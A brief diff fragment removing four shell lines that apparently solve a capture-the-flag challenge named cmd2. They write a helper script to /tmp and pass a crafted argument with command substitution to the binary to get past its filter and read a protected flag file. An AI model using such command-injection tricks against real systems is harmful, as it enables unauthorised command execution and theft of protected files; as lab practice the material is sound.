@@ -1,4 +1,0 @@
-$ echo "export PATH=/bin && cat /home/cmd2/flag" > /tmp/tmpnick
-$ chmod +x /tmp/tmpnick
-$ ./cmd2 'cd .. && cd .. && cd tmp && .$(echo $(pwd)nick)'
-cd .. && cd .. && cd tmp && .$(echo $(pwd)nick)
